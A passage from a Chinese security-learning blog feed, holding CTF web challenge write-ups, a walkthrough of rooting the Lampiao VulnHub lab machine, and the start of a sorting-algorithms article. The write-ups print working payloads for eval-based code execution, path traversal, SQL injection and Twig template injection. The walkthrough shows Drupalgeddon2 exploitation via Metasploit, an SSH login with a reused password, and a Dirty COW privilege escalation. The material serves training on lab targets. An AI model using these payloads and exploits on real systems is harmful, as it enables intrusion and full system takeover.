punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'code'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token variable">$code</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'code'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">"/[A-Za-z0-9_$@]+/"</span><span class="token punctuation">,</span><span class="token variable">$code</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'fighting!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token punctuation">}</span>    <span class="token function">eval</span><span class="token punctuation">(</span><span class="token variable">$code</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>此题目过滤了所有的字母和数字以及下划线$@符号，这种无敌的过滤，只有神才能做出来，欲做此题，先看<a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html" target="_blank" rel="noopener">p神的文章</a></p><h3 id="解题思路：-1"><a href="#解题思路：-1" class="headerlink" title="解题思路："></a>解题思路：</h3><p>1.利用.来执行脚本</p><p>2.利用linux的通配符来实现匹配文件的名字</p><h3 id="解题：-8"><a href="#解题：-8" class="headerlink" title="解题："></a>解题：</h3><p>构造post文件上传的数据包用来上传文件：将以下代码在本地构造，然后浏览器运行再抓包</p><pre class="line-numbers language-html"><code class="language-html"><span class="token doctype">&lt;!DOCTYPE html></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>en<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>UTF-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>viewport<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>width<span class="token punctuation">=</span>device-width, initial-scale<span class="token punctuation">=</span>1.0<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>POST数据包POC<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>http://46230c96-8291-44b8-a58c-c133ec248231.chall.ctf.show/<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>post<span class="token punctuation">"</span></span> <span class="token attr-name">enctype</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>multipart/form-data<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token comment" spellcheck="true">&lt;!--链接是当前打开的题目链接--></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>label</span> <span class="token attr-name">for</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>文件名：<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>label</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>提交<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>写脚本：</p><pre><code>#!/bin/shcat /flag</code></pre><p>构造poc：</p><pre><code>?code=?&gt;&lt;?=`. /???/????????[?-[]`;?&gt;</code></pre><h2 id="2018-HCTF-Web-warmup"><a href="#2018-HCTF-Web-warmup" class="headerlink" title="2018-HCTF-Web-warmup"></a>2018-HCTF-Web-warmup</h2><p>访问source.php</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">class</span> <span class="token class-name">emmm</span>    <span class="token punctuation">{</span>        <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">function</span> <span class="token function">checkFile</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token variable">$page</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token variable">$whitelist</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"source"</span><span class="token operator">=</span><span class="token operator">></span><span class="token string">"source.php"</span><span class="token punctuation">,</span><span class="token string">"hint"</span><span class="token operator">=</span><span class="token operator">></span><span class="token string">"hint.php"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span> <span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$page</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token operator">!</span><span class="token function">is_string</span><span class="token punctuation">(</span><span class="token variable">$page</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">echo</span> <span class="token string">"you can't see it"</span><span class="token punctuation">;</span>                <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$page</span><span class="token punctuation">,</span> <span class="token variable">$whitelist</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token variable">$_page</span> <span class="token operator">=</span> <span class="token function">mb_substr</span><span class="token punctuation">(</span>                <span class="token variable">$page</span><span class="token punctuation">,</span>                <span class="token number">0</span><span class="token punctuation">,</span>                <span class="token function">mb_strpos</span><span class="token punctuation">(</span><span class="token variable">$page</span> <span class="token punctuation">.</span> <span class="token string">'?'</span><span class="token punctuation">,</span> <span class="token string">'?'</span><span class="token punctuation">)</span>            <span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$_page</span><span class="token punctuation">,</span> <span class="token variable">$whitelist</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token variable">$_page</span> <span class="token operator">=</span> <span class="token function">urldecode</span><span class="token punctuation">(</span><span class="token variable">$page</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$_page</span> <span class="token operator">=</span> <span class="token function">mb_substr</span><span class="token punctuation">(</span>                <span class="token variable">$_page</span><span class="token punctuation">,</span>                <span class="token number">0</span><span class="token punctuation">,</span>                <span class="token function">mb_strpos</span><span class="token punctuation">(</span><span class="token variable">$_page</span> <span class="token punctuation">.</span> <span class="token string">'?'</span><span class="token punctuation">,</span> <span class="token string">'?'</span><span class="token punctuation">)</span>            <span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$_page</span><span class="token punctuation">,</span> <span class="token variable">$whitelist</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token keyword">echo</span> <span class="token string">"you can't see it"</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span> <span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token operator">&amp;&amp;</span> <span class="token function">is_string</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token operator">&amp;&amp;</span> emmm<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">checkFile</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">include</span> <span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        exit<span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string">"&lt;br>&lt;img src=\"https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\" />"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>  <span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>访问hint.php：</p><p>flag not here, and flag in ffffllllaaaagggg</p><p>利用的是文件包含漏洞：</p><p>利用source中的include，来将flag.php在source.php中显示出来</p><pre><code>?file=source.php?/../../../../ffffllllaaaagggg</code></pre><p>然后进行两次URL编码:</p><pre><code>?file=source.php%253F/../../../../ffffllllaaaagggg</code></pre><p>注意细节：/../../../../ffffllllaaaagggg</p><h2 id="强网杯-2019-Web-高明的黑客"><a href="#强网杯-2019-Web-高明的黑客" class="headerlink" title="强网杯-2019-Web-高明的黑客"></a>强网杯-2019-Web-高明的黑客</h2><p>给了一大堆php后门文件，要用脚本去跑可以用的文件</p><p>木马：xk0SzyKwfzw.php?Efa5BVG=cat /flag</p><p>Efa5BVG</p><h2 id="SUCTF-2019-Web-easysql"><a href="#SUCTF-2019-Web-easysql" class="headerlink" title="SUCTF-2019-Web-easysql"></a>SUCTF-2019-Web-easysql</h2><h3 id="知识点：-1"><a href="#知识点：-1" class="headerlink" title="知识点："></a>知识点：</h3><p>利用mysql的内置变量将||的性质改变为字符串的连接符，而非或运算符</p><p>堆叠注入</p><h3 id="操作："><a href="#操作：" class="headerlink" title="操作："></a>操作：</h3><p>源码：</p><pre><code>select $_GET[&#39;query&#39;] || flag from flag</code></pre><p>解法一：</p><pre><code>1;set sql_mode=PIPES_AS_CONCAT;select 1</code></pre><p>相当于：select 1,flag from Flag</p><p>解法二：</p><pre><code>*,1</code></pre><p>相当于select *,1||flag from Flag 取得全部数据</p><h2 id="BJDCTF-2020-web-cookie-is-so-subtle-尚未解决"><a href="#BJDCTF-2020-web-cookie-is-so-subtle-尚未解决" class="headerlink" title="BJDCTF-2020-web-cookie is so subtle!(尚未解决)"></a>BJDCTF-2020-web-cookie is so subtle!(尚未解决)</h2><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201102181051434.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3JmcmRlcg==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>利用这个方法来判断模板注入的哪个模板，然后返回值为49所以是Twig，如果是7777777则是Jinja2</p><p>然后搜索一下twig的模板注入</p><pre><code>{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("cat /flag")}}</code></pre>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 入门 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>lampiao渗透测试初探</title>
      <link href="/2020/12/19/lampiao-shen-tou-chu-tan/"/>
      <url>/2020/12/19/lampiao-shen-tou-chu-tan/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="lampiao靶机渗透测试笔记"><a href="#lampiao靶机渗透测试笔记" class="headerlink" title="lampiao靶机渗透测试笔记"></a>lampiao靶机渗透测试笔记</h1><h4 id="简单介绍："><a href="#简单介绍：" class="headerlink" title="简单介绍："></a>简单介绍：</h4><pre><code>Would you like to keep hacking in your own lab?Try this brand new vulnerable machine! &quot;Lampião 1&quot;.Get root!Level: Easy翻译：你想在自己的实验室里继续黑客攻击吗？试试这个全新的易受攻击的机器！”Lampião 1”。获得root权限级别：简单下载地址：https://www.vulnhub.com/entry/lampiao-1,249/</code></pre><h4 id="采坑："><a href="#采坑：" class="headerlink" title="采坑："></a>采坑：</h4><p>1.下载靶机后会发现ovf文件，用VMware打开</p><p>2.压缩包不要解压！</p><h2 id="OK了，开始测试："><a href="#OK了，开始测试：" class="headerlink" title="OK了，开始测试："></a>OK了，开始测试：</h2><h3 id="第一阶段：信息收集"><a href="#第一阶段：信息收集" class="headerlink" title="第一阶段：信息收集"></a>第一阶段：信息收集</h3><p>ifconfig查看自己的ip地址：192.168.204.xxx</p><h4 id="扫描自己的内网（发现阶段）"><a href="#扫描自己的内网（发现阶段）" class="headerlink" title="扫描自己的内网（发现阶段）"></a>扫描自己的内网（发现阶段）</h4><pre><code>nmap -sP 192.168.204.0/24</code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//1.jpg" alt></p><p>这里是对-sP命令的介绍：</p><p>1.-Pn是默认目标主机是存活的，-sP是使用ICMP协议发送echo请求数据包，但是很容易被防火墙过滤掉。想尽可能发现所有存活主机的话，建议使用半开式扫描参数-sS或者ACK扫描参数-sA，还无法确定存活主机的话可以试试-sF -sX -sN等参数。</p><p>2.nmap 执行（至少）两步操作，一个是主机发现（Ping），另一个是主机扫描。默认两步是都做的，-P0/-Pn 关闭主机发现，-sP/-sn 关闭主机扫描。两个一起用就是啥也不干，比如 nmap 0.0.0.0 -P0 -sP 显示“host is up”。按照你的要求，不做主机扫描，应该是 -sP，Ping 协议/端口被挡，可以用 -P 的其它选项。比如用 TCP SYN -PS 应该是最快的，UDP -PU 也可以。</p><p>只是扫描整个网段里面的所有ip，如果有ping的通的，通过-sP命令会给你显示出来（存活的主机）。</p><p>这里发现扫描到的主机有好几台，但是我们的目标是获取lampiao的ip地址，so需要进一步判断：</p><p>1.在lampiao靶机的网络配置里面找到mac地址</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//2.png" alt></p><p>2.在存活的主机里面找到与之相对应的mac地址</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//3.png" alt></p><p>3.得到lampiao的IP地址:192.168.204.137</p><h4 id="开始对主机进行扫描："><a href="#开始对主机进行扫描：" class="headerlink" title="开始对主机进行扫描："></a>开始对主机进行扫描：</h4><p>使用如下命令：</p><pre><code>nmap -A -p- -T4 192.168.204.137</code></pre><pre><code>这里-p是指所有的端口nmap -p(port1,port2,port3,...) &lt;target ip&gt;  解释：指定几个端口进行扫描例子：nmap -p80,443,22,21,8080,25,53 192.168.2.107</code></pre><pre><code>-T4： 指定扫描过程使用的时序，总有6个级别（0-5），级别越高，扫描速度越快，但也容易被防火墙或IDS检测并屏蔽掉，在网络通讯状况较好的情况下推荐使用T4</code></pre><pre><code>nmap -A &lt;target ip&gt; 解释：nmap 万能开关次选项设置包含了1-10000的端口ping扫描，操作系统扫描，脚本扫描，路由跟踪，服务探测。例子：nmap -A 192.168.2.107</code></pre><p>经过扫描得到了3个端口：22、80、1898</p><pre><code>可以发现，目标主机开放了三个端口，分别是22,80和1898,22端口是ssh服务，80端口是http服务，但是信息不是很详细，1898端口开放的是http服务，并且使用了Drupal框架</code></pre><p>另一种扫描方法：</p><pre><code>nmap -sS -sV -Pn -n  -A 192.168.191.133-sS 使用SYN半开式扫描，这种扫描方式使得扫描结果更加正确(又称半开放,或隐身扫描)-sV 探测端口的服务类型/具体版本等信息-Pn 禁用主机检测,目标主机屏蔽了ping请求时可用-n表示不进行dns解析，-p表示要-A强力扫描，耗时长</code></pre><p>这种方法比上一种方法要快，且更为保险</p><p>Drupal框架显示在这里：</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//4.png" alt></p><p>得到版本为7（忘记截屏了），还发现了一些目录和文件！！</p><p>例如：/robots.txt文件</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//5.png" alt>g)</p><p>然后打开浏览器访问192.168.204.137:80端口得到如下页面（啥也没有。。。）：</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//6.png" alt></p><p>但是当我们访问1898端口的时候出现如下页面：</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//7.png" alt></p><h3 id="第二阶段：漏洞利用"><a href="#第二阶段：漏洞利用" class="headerlink" title="第二阶段：漏洞利用"></a>第二阶段：漏洞利用</h3><pre><code>在扫描端口的时候可以发现目标使用了Drupal框架，并且是7的版本，7的版本存在一些漏洞，可以利用这些漏洞来获得shell在网站中查找信息，看能否找到Drupal的具体版本查看网站的robots.txt文件</code></pre><p>这里是因为通过扫描发现了robots.txt（属于敏感信息范畴）</p><p>访问：</p><p>192.168.204.137:1898/robots.txt</p><p>得到如下信息：</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//8.png" alt></p><p>这里是在注释为文件一栏目中的文件：changelog.txt（这里为大写）意思为改变的日志（更新日志）</p><p>访问192.168.204.137:1898/CHANGELOG.txt得到如下信息：</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//9.png" alt></p><p>得到drupal的版本信息：7.54</p><p>然后就可以去网上搜索一下关于该版本的漏洞，然后针对漏洞进行攻击！</p><pre><code>在网上可以查到Drupal7.54存在的漏洞：https://cve.mitre.org/cgi-bin/cvekey.cgi?keyword=drupal可以利用metasploit来针对此版本的Drupal进行攻击，获得shell（咋看出来的我也不知道）经过查阅发现msf可以搜索一个框架的漏洞</code></pre><p>建议搜狗访问（因为可以翻译，别的浏览器我找不到在哪里翻译-_-||）然后翻译后发现：</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//10.png" alt></p><p>这个版本的漏洞简直数不胜数（但是现在的依然需要根据教程来操作-_-||）</p><h3 id="接下来就是针对msf的使用"><a href="#接下来就是针对msf的使用" class="headerlink" title="接下来就是针对msf的使用"></a>接下来就是针对msf的使用</h3><p>1.</p><pre><code>search drupal搜索其漏洞得到：</code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//11.png" alt></p><p>2.使用Drupal Drupalgeddon 2 Forms API Property Injection（远程代码执行漏洞）</p><pre><code>use 4set rhost 192.168.204.137set rport 1898show targetsset target 0#查看以及设置目标操作系统类型run #上面两步推荐的方式，这里我们直接run，这步结束后会得到一个会话用来连接对面的shellshellpython -c &#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39; #执行shell获取交互式命令，由于我们获取的shell并不是一个具有完整交互的shell，对于已经安装了python的系统，我们可以使用 python提供的pty模块，只需要一行脚本就可以创建一个原生的终端，命令如上</code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//12.png" alt></p><p>此时获取了shell然后开始查看当下目录</p><p>在var/www/html/sites/default目录下找到配置文件settings.php，发现敏感信息，tiago以及密码，很有可能就是其系统用户tiago的密码，如下图：</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//321.jpg" alt></p><p>打开192.168.204.137:1898端口，发现了一篇文章的提交者，说明什么！这个人就很有可能是这个网站的管理员，或者系统用户所以就试试呗，毕竟信息收集也就这么多了。。</p><p>然后利用ssh协议进行远程登录</p><pre><code>ssh tiago@192.168.204.137</code></pre><p>成功获取shell！</p><p>最重要一步↓</p><h3 id="脏牛提权！！"><a href="#脏牛提权！！" class="headerlink" title="脏牛提权！！"></a>脏牛提权！！</h3><pre><code>uname -a查看一下内核信息：2016年的这是searchsploit dirty直接脏牛的木马喽一眼//看网上说用这个脚本提权cp /usr/share/exploitdb/exploits/linux/local/40847.cpp ~注意这里的 ~,他前面的是这个脚本的文件目录，~可以改为/root或者/home反正就是搁主目录下，一个ls就能看见那种</code></pre><p>如下图：</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE20%E5%B9%B412%E6%9C%8825%E6%97%A52134_1.png" alt></p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE20%E5%B9%B412%E6%9C%8825%E6%97%A52137_2.png" alt></p><p>然后再回到msf页面ctrl+c返回控制台 </p><pre><code>meterpreter &gt; upload /root/40847.cpp /tmp/40847.cpp</code></pre><p>把我/root文件下的目录传到/tmp目录下</p><pre><code>shell//继续连接回去python -c &#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39;//进入TTL终端</code></pre><p>然后回到/tmp目录下ls查看：</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE20%E5%B9%B412%E6%9C%8825%E6%97%A52227_4.png" alt></p><pre><code>g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil进行编译这是关于参数1-Wall 一般使用该选项，允许发出GCC能够提供的所有有用的警告2-pedantic 允许发出ANSI/ISO C标准所列出的所有警告3-O2编译器的优化选项的4个级别，-O0表示没有优化,-O1为缺省值，-O3优化级别最高4-std=c++11就是用按C++2011标准来编译的5-pthread 在Linux中要用到多线程时，需要链接pthread库6-o dcow gcc生成的目标文件,名字为dcow./dcow -s#执行该文件 ./dcow &gt; status.txt有同样的效果</code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE20%E5%B9%B412%E6%9C%8825%E6%97%A52217_3.png" alt></p><p>然后会发现该漏洞利用成功，已将root密码修改！</p><pre><code>www-data@lampiao:/tmp$ ./dcow &gt; status.txt./dcow &gt; status.txtRunning ...Received su prompt (Password: )Root password is:   dirtyCowFunEnjoy! :-)www-data@lampiao:/tmp$ su rootsu rootPassword: dirtyCowFunroot@lampiao:/tmp# lsroot@lampiao:/# cd /rootcd /rootroot@lampiao:~# lslsflag.txtroot@lampiao:~# cat flag.txtcat flag.txt9740616875908d91ddcdaa8aea3af366</code></pre><p>能做到此步十分感谢，十分感谢网上各位大佬的wp</p><p>总结：</p><p>对各种工具的掌握十分fw</p><p>不会就百度</p><p>对脏牛提权有了大体的认识</p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 靶机 </tag>
            
            <tag> 入门 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>十大经典排序算法整理汇总（附代码）</title>
      <link href="/2020/02/16/sort-algorithms/"/>
      <url>/2020/02/16/sort-algorithms/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><blockquote><p>每日算法干货马上就来！</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/02/16/sort-algorithms/../themes/matery/source/medias/contact.jpg" alt></p><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>本文整理并总结了十大经典的排序算法（冒泡排序、选择排序、插入排序、快速排序、归并排序、希尔排序、计数排序、基数排序、桶排序、堆排序）的时间复杂度、空间复杂度等性质。</p><p><strong>本文并不会详细讲解每种排序算法的原理</strong>，网上有很多很好的教程，大家可以自己去搜了看。</p><p>最后我还亲自手写了十种排序算法的 c++ 代码，大家可以用来通过 <a href="https://leetcode-cn.com/problems/sort-an-array/" title="LeetCode 912. 排序数组" target="_blank" rel="noopener">LeetCode 912. 排序数组</a> 这道题。</p><h2 id="性质汇总"><a href="#性质汇总" class="headerlink" title="性质汇总"></a>性质汇总</h2><blockquote><p>如果发现表中有错误，请留言告知。</p></blockquote><table><thead><tr><th>算法</th><th>最好</th><th>最坏</th><th>平均</th><th>空间</th><th align="center">稳定性</th><th align="center">是否基于比较</th></tr></thead><tbody><tr><td>冒泡排序</td><td>$O(n)$</td><td>$O(n^2)$</td><td>$O(n^2)$</td><td>$O(1)$</td><td align="center">$\checkmark$</td><td align="center">$\checkmark$</td></tr><tr><td>选择排序</td><td>$O(n^2)$</td><td>$O(n^2)$</td><td>$O(n^2)$</td><td>$O(1)$</td><td align="center">$\times$</td><td align="center">$\checkmark$</td></tr><tr><td>插入排序</td><td>$O(n)$</td><td>$O(n^2)$</td><td>$O(n^2)$</td><td>$O(1)$</td><td align="center">$\checkmark$</td><td align="center">$\checkmark$</td></tr><tr><td>快速排序</td><td>$O(n\log 